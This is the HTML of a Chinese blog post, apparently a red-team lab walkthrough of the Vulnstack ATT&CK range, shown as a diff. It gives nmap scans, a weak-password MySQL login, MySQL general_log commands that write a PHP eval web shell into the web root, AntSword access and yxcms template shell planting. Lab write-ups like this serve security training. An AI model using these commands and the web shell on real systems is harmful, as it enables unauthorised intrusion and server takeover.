@@ -1,0 +1,639 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/t.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/t-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/t-16x16-next.png">
+  <link rel="mask-icon" href="/images/t-32x32-next.png" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('https://timorblog.cn').hostname,
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.6.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":true},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="简介红队实战系列，主要以真实企业环境为实例搭建一系列靶场，通过练习、视频教程、博客三位一体学习。另外本次实战完全模拟ATT&amp;CK攻击链路进行搭建，开成完整闭环。后续也会搭建真实APT实战环境，从实战中成长。关于环境可以模拟出各种各样实战路线，目前给出作者实战的一套攻击实战路线如下，虚拟机所有统一密码：hongrisec@2019。 下载地址http:&#x2F;&#x2F;vulnstack.qiyuanxu">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vlunstack ATT&amp;CK实战系列0×1">
+<meta property="og:url" content="https:&#x2F;&#x2F;timorblog.cn&#x2F;posts&#x2F;1cb8ad01.html">
+<meta property="og:site_name" content="Timorblog">
+<meta property="og:description" content="简介红队实战系列，主要以真实企业环境为实例搭建一系列靶场，通过练习、视频教程、博客三位一体学习。另外本次实战完全模拟ATT&amp;CK攻击链路进行搭建，开成完整闭环。后续也会搭建真实APT实战环境，从实战中成长。关于环境可以模拟出各种各样实战路线，目前给出作者实战的一套攻击实战路线如下，虚拟机所有统一密码：hongrisec@2019。 下载地址http:&#x2F;&#x2F;vulnstack.qiyuanxu">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https:&#x2F;&#x2F;timorblog.cn&#x2F;posts&#x2F;1cb8ad01&#x2F;2.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;timorblog.cn&#x2F;posts&#x2F;1cb8ad01&#x2F;1.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;timorblog.cn&#x2F;posts&#x2F;1cb8ad01&#x2F;3.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;timorblog.cn&#x2F;posts&#x2F;1cb8ad01&#x2F;4.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;timorblog.cn&#x2F;posts&#x2F;1cb8ad01&#x2F;5.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;timorblog.cn&#x2F;posts&#x2F;1cb8ad01&#x2F;6.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;timorblog.cn&#x2F;posts&#x2F;1cb8ad01&#x2F;7.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;timorblog.cn&#x2F;posts&#x2F;1cb8ad01&#x2F;8.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;timorblog.cn&#x2F;posts&#x2F;1cb8ad01&#x2F;9.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;timorblog.cn&#x2F;posts&#x2F;1cb8ad01&#x2F;10.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;timorblog.cn&#x2F;posts&#x2F;1cb8ad01&#x2F;11.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;timorblog.cn&#x2F;posts&#x2F;1cb8ad01&#x2F;12.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;timorblog.cn&#x2F;posts&#x2F;1cb8ad01&#x2F;13.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;timorblog.cn&#x2F;posts&#x2F;1cb8ad01&#x2F;14.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;timorblog.cn&#x2F;posts&#x2F;1cb8ad01&#x2F;15.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;timorblog.cn&#x2F;posts&#x2F;1cb8ad01&#x2F;16.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;timorblog.cn&#x2F;posts&#x2F;1cb8ad01&#x2F;18.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;timorblog.cn&#x2F;posts&#x2F;1cb8ad01&#x2F;17.png">
+<meta property="article:published_time" content="2020-03-05T07:40:38.000Z">
+<meta property="article:modified_time" content="2020-03-16T07:25:24.092Z">
+<meta property="article:author" content="Timor">
+<meta property="article:tag" content="Timor">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="WEB安全">
+<meta property="article:tag" content="SQL注入">
+<meta property="article:tag" content="提权">
+<meta property="article:tag" content="GETSHELL">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;timorblog.cn&#x2F;posts&#x2F;1cb8ad01&#x2F;2.png">
+
+<link rel="canonical" href="https://timorblog.cn/posts/1cb8ad01.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>Vlunstack ATT&CK实战系列0×1 | Timorblog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Timorblog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <h1 class="site-subtitle" itemprop="description">一个学习安全的小白</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签<span class="badge">19</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类<span class="badge">5</span></a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档<span class="badge">26</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://timorblog.cn/posts/1cb8ad01.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/xiaobai.jpg">
+      <meta itemprop="name" content="Timor">
+      <meta itemprop="description" content="渗透测试|网络安全|信息安全|WEB安全">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Timorblog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          Vlunstack ATT&CK实战系列0×1
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-03-05 15:40:38" itemprop="dateCreated datePublished" datetime="2020-03-05T15:40:38+08:00">2020-03-05</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-03-16 15:25:24" itemprop="dateModified" datetime="2020-03-16T15:25:24+08:00">2020-03-16</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>红队实战系列，主要以真实企业环境为实例搭建一系列靶场，通过练习、视频教程、博客三位一体学习。另外本次实战完全模拟ATT&amp;CK攻击链路进行搭建，开成完整闭环。后续也会搭建真实APT实战环境，从实战中成长。关于环境可以模拟出各种各样实战路线，目前给出作者实战的一套攻击实战路线如下，虚拟机所有统一密码：hongrisec@2019。</p>
+<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p><a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/" target="_blank" rel="noopener">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a><br>（没有百度云会员的我苦苦的下载了2天QAQ）</p>
+<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><img src="/posts/1cb8ad01/2.png" class="" title="This is an 2 image">
+<img src="/posts/1cb8ad01/1.png" class="" title="This is an 1 image">
+<img src="/posts/1cb8ad01/3.png" class="" title="This is an 3 image">
+<img src="/posts/1cb8ad01/4.png" class="" title="This is an 4 image">
+<img src="/posts/1cb8ad01/5.png" class="" title="This is an 5 image">
+<img src="/posts/1cb8ad01/6.png" class="" title="This is an 6 image">
+<p>Windows 7有双网卡，也就是内外网IP<br>外网IP：192.168.54.x<br>内网IP：192.168.52.x<br>且此服务器存在yxcms<br>Windows 2008只有内网网卡<br>内网IP： 192.168.52.x<br>Win2k3只有内网网卡<br>内网IP：192.168.52.x<br>kali 也配置为外网IP:192.168.54.128</p>
+<p>那么kali和win7就在同一网段，需要先那先win7在拿下win2008和win2k3</p>
+<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>先扫描一下存活主机</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">oot@</span>kali:~# nmap -sP <span class="number">192.168</span><span class="number">.54</span><span class="number">.0</span>/<span class="number">24</span></span><br><span class="line">Starting Nmap <span class="number">7.80</span> ( https:<span class="comment">//nmap.org ) at 2020-03-05 03:51 EST</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.54</span><span class="number">.1</span></span><br><span class="line">Host <span class="keyword">is</span> up (<span class="number">0.00017</span>s latency).</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">50</span>:<span class="number">56</span>:C0:<span class="number">00</span>:<span class="number">01</span> (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.54</span><span class="number">.129</span></span><br><span class="line">Host <span class="keyword">is</span> up (<span class="number">0.00044</span>s latency).</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:AF:<span class="number">98</span>:<span class="number">9</span>F (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.54</span><span class="number">.254</span></span><br><span class="line">Host <span class="keyword">is</span> up (<span class="number">0.000046</span>s latency).</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">50</span>:<span class="number">56</span>:FE:<span class="number">9</span>A:C3 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.54</span><span class="number">.128</span></span><br><span class="line">Host <span class="keyword">is</span> up.</span><br><span class="line">Nmap done: <span class="number">256</span> IP addresses (<span class="number">4</span> hosts up) scanned <span class="keyword">in</span> <span class="number">27.78</span> seconds</span><br></pre></td></tr></table></figure>
+<p>发现IP：192.168.54.129<br>扫描一下这个IP</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# nmap <span class="number">192.168</span><span class="number">.54</span><span class="number">.129</span></span><br><span class="line">Starting Nmap <span class="number">7.80</span> ( https:<span class="comment">//nmap.org ) at 2020-03-05 05:16 EST</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.54</span><span class="number">.129</span></span><br><span class="line">Host <span class="keyword">is</span> up (<span class="number">0.00041</span>s latency).</span><br><span class="line">All <span class="number">1000</span> scanned ports on <span class="number">192.168</span><span class="number">.54</span><span class="number">.129</span> are filtered</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:AF:<span class="number">98</span>:<span class="number">9</span>F (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">34.40</span> seconds</span><br></pre></td></tr></table></figure>
+<p>我去80去哪了？靶机里看了一眼 80没开  还要我自己开。。。<br>c盘有个phpstudy 打开</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# nmap <span class="number">192.168</span><span class="number">.54</span><span class="number">.129</span></span><br><span class="line">Starting Nmap <span class="number">7.80</span> ( https:<span class="comment">//nmap.org ) at 2020-03-05 05:27 EST</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.54</span><span class="number">.129</span></span><br><span class="line">Host <span class="keyword">is</span> up (<span class="number">0.00037</span>s latency).</span><br><span class="line">Not shown: <span class="number">998</span> filtered ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">80</span>/tcp   open  http</span><br><span class="line"><span class="number">3306</span>/tcp open  mysql</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:AF:<span class="number">98</span>:<span class="number">9</span>F (VMware)</span><br></pre></td></tr></table></figure>
+<p>好了 扫出80和3306端口<br>80端口就是web漏洞了<br>3306 mysql 有可能存在弱口令 一会试一下<br>先进入网页看看<br>phpstudy探针页面</p>
+<img src="/posts/1cb8ad01/7.png" class="" title="This is an 7 image">
+<p>存在一下信息</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">操作系统：windows <span class="number">7</span> 专业版</span><br><span class="line">服务器主机名：STU1</span><br><span class="line">网站绝对路径：C:/phpStudy/WWW</span><br><span class="line">服务器解译引擎：Apache/<span class="number">2.4</span><span class="number">.23</span> (Win32) OpenSSL/<span class="number">1.0</span><span class="number">.2</span>j PHP/<span class="number">5.4</span><span class="number">.45</span></span><br></pre></td></tr></table></figure>
+<p>正好探针下面有Mysql数据库连接检测，那就试一下弱密</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">账号<span class="built_in"> root</span></span><br><span class="line">密码<span class="built_in"> root</span></span><br></pre></td></tr></table></figure>
+<img src="/posts/1cb8ad01/8.png" class="" title="This is an 8 image">
+<p>对了。。。。这就很尴尬<br>继续往下做吧，多找点漏洞，也不能对不起2天的下载时间<br>用dirsearch扫一波目录</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">l</span><span class="selector-class">.php</span></span><br><span class="line"><span class="selector-tag">phpinfo</span><span class="selector-class">.php</span></span><br><span class="line"><span class="selector-tag">phpmyadmin</span></span><br></pre></td></tr></table></figure>
+<p>扫出这三个，因为知道数据库密码和绝对路径，phpmyadmin可以直接上马<br>又换了个字典扫了一下还是没扫出来 就用phpmyadmin上马吧。。</p>
+<img src="/posts/1cb8ad01/9.png" class="" title="This is an 9 image">
+<p>MySQL限制了导入与导出的目录权限。只允许在规定的目录下才能导入<br>可以用phpmyadmin通过日志写入一句话木马试一下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">VARIABLES</span> <span class="keyword">LIKE</span> <span class="string">'general_log%'</span></span><br></pre></td></tr></table></figure>
+<img src="/posts/1cb8ad01/10.png" class="" title="This is an 10 image">
+<p>日志功能是关闭的需要把他开启</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log=<span class="keyword">on</span>;</span><br></pre></td></tr></table></figure>
+<p>修改日志文件保存位置</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">set</span> global <span class="attribute">general_log_file</span>=<span class="string">'C:/phpStudy/WWW/1.php'</span>;</span><br></pre></td></tr></table></figure>
+<p>写入一句话木马（直接查找一句话木马就可以MySQL会把这句话记录到日志）</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select '<span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[kill]);<span class="meta">?&gt;</span></span>'</span><br></pre></td></tr></table></figure>
+<p>ok 成功上马 </p>
+<img src="/posts/1cb8ad01/11.png" class="" title="This is an 11 image">
+<p>使用蚁剑连接</p>
+<img src="/posts/1cb8ad01/12.png" class="" title="This is an 12 image">
+<p>连接上之后发现<code>yxcms</code>和<code>beifen.rar</code>文件<br>重新来过再看看有没有其他漏洞</p>
+<img src="/posts/1cb8ad01/13.png" class="" title="This is an 13 image">
+<p>把备份文件下载下来之后看到是yxcms1.2.1版本的再看看李梅有什么有用的</p>
+<img src="/posts/1cb8ad01/14.png" class="" title="This is an 14 image">
+<p>账号<code>admin</code>密码的md5值 去解密得出<code>949ba59abbe56e05</code><br>登录发现不对，再去备份文件里看一下</p>
+<img src="/posts/1cb8ad01/15.png" class="" title="This is an 15 image">
+<p>加东西了 在解密一下密码为<code>123456</code><br>账号密码都有了  那就登录</p>
+<img src="/posts/1cb8ad01/16.png" class="" title="This is an 16 image">
+<p>感觉这几个都有可能getshell</p>
+<p>全局设置–&gt;前台模板–&gt;管理文件模板–&gt;随便找一个php文件编辑插马就可以了<br>用蚁剑进入虚拟终端信息收集一下</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="symbol">\p</span>hpStudy<span class="symbol">\W</span>WW&gt; whoami</span><br><span class="line">god<span class="symbol">\a</span>dministrator</span><br></pre></td></tr></table></figure>
+<p>管理员权限</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">C:\phpStudy\WWW&gt; netstat -ano</span><br><span class="line">活动连接</span><br><span class="line">  协议  本地地址          外部地址        状态           PID</span><br><span class="line">  TCP    <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">80</span>             <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">0</span>              LISTENING       <span class="number">1948</span></span><br><span class="line">  TCP    <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">135</span>            <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">0</span>              LISTENING       <span class="number">732</span></span><br><span class="line">  TCP    <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">445</span>            <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">0</span>              LISTENING       <span class="number">4</span></span><br><span class="line">  TCP    <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">1025</span>           <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">0</span>              LISTENING       <span class="number">404</span></span><br><span class="line">  TCP    <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">1026</span>           <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">0</span>              LISTENING       <span class="number">820</span></span><br><span class="line">  TCP    <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">1027</span>           <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">0</span>              LISTENING       <span class="number">880</span></span><br><span class="line">  TCP    <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">1028</span>           <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">0</span>              LISTENING       <span class="number">516</span></span><br><span class="line">  TCP    <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">1029</span>           <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">0</span>              LISTENING       <span class="number">508</span></span><br><span class="line">  TCP    <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">3306</span>           <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">0</span>              LISTENING       <span class="number">2116</span></span><br><span class="line">  TCP    <span class="number">169.254</span><span class="number">.129</span><span class="number">.186</span>:<span class="number">139</span>    <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">0</span>              LISTENING       <span class="number">4</span></span><br><span class="line">  TCP    <span class="number">192.168</span><span class="number">.52</span><span class="number">.143</span>:<span class="number">139</span>     <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">0</span>              LISTENING       <span class="number">4</span></span><br><span class="line">  TCP    <span class="number">192.168</span><span class="number">.54</span><span class="number">.129</span>:<span class="number">80</span>      <span class="number">192.168</span><span class="number">.54</span><span class="number">.1</span>:<span class="number">58669</span>     CLOSE_WAIT      <span class="number">1948</span></span><br><span class="line">  TCP    <span class="number">192.168</span><span class="number">.54</span><span class="number">.129</span>:<span class="number">80</span>      <span class="number">192.168</span><span class="number">.54</span><span class="number">.1</span>:<span class="number">58713</span>     ESTABLISHED     <span class="number">1948</span></span><br><span class="line">  TCP    <span class="number">192.168</span><span class="number">.54</span><span class="number">.129</span>:<span class="number">139</span>     <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">0</span>              LISTENING       <span class="number">4</span></span><br><span class="line">  TCP    [::]:<span class="number">80</span>                [::]:<span class="number">0</span>                 LISTENING       <span class="number">1948</span></span><br><span class="line">  TCP    [::]:<span class="number">135</span>               [::]:<span class="number">0</span>                 LISTENING       <span class="number">732</span></span><br><span class="line">  TCP    [::]:<span class="number">445</span>               [::]:<span class="number">0</span>                 LISTENING       <span class="number">4</span></span><br><span class="line">  TCP    [::]:<span class="number">1025</span>              [::]:<span class="number">0</span>                 LISTENING       <span class="number">404</span></span><br><span class="line">  TCP    [::]:<span class="number">1026</span>              [::]:<span class="number">0</span>                 LISTENING       <span class="number">820</span></span><br><span class="line">  TCP    [::]:<span class="number">1027</span>              [::]:<span class="number">0</span>                 LISTENING       <span class="number">880</span></span><br><span class="line">  TCP    [::]:<span class="number">1028</span>              [::]:<span class="number">0</span>                 LISTENING       <span class="number">516</span></span><br><span class="line">  TCP    [::]:<span class="number">1029</span>              [::]:<span class="number">0</span>                 LISTENING       <span class="number">508</span></span><br><span class="line">  UDP    <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">68</span>             *:*                                    <span class="number">820</span></span><br><span class="line">  UDP    <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">123</span>            *:*                                    <span class="number">100</span></span><br><span class="line">  UDP    <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">5355</span>           *:*                                    <span class="number">640</span></span><br><span class="line">  UDP    <span class="number">169.254</span><span class="number">.129</span><span class="number">.186</span>:<span class="number">137</span>    *:*                                    <span class="number">4</span></span><br><span class="line">  UDP    <span class="number">169.254</span><span class="number">.129</span><span class="number">.186</span>:<span class="number">138</span>    *:*                                    <span class="number">4</span></span><br><span class="line">  UDP    <span class="number">192.168</span><span class="number">.52</span><span class="number">.143</span>:<span class="number">137</span>     *:*                                    <span class="number">4</span></span><br><span class="line">  UDP    <span class="number">192.168</span><span class="number">.52</span><span class="number">.143</span>:<span class="number">138</span>     *:*                                    <span class="number">4</span></span><br><span class="line">  UDP    <span class="number">192.168</span><span class="number">.54</span><span class="number">.129</span>:<span class="number">137</span>     *:*                                    <span class="number">4</span></span><br><span class="line">  UDP    <span class="number">192.168</span><span class="number">.54</span><span class="number">.129</span>:<span class="number">138</span>     *:*                                    <span class="number">4</span></span><br><span class="line">  UDP    [::]:<span class="number">123</span>               *:*                                    <span class="number">100</span></span><br><span class="line">  UDP    [::]:<span class="number">5355</span>              *:*                                    <span class="number">640</span></span><br></pre></td></tr></table></figure>
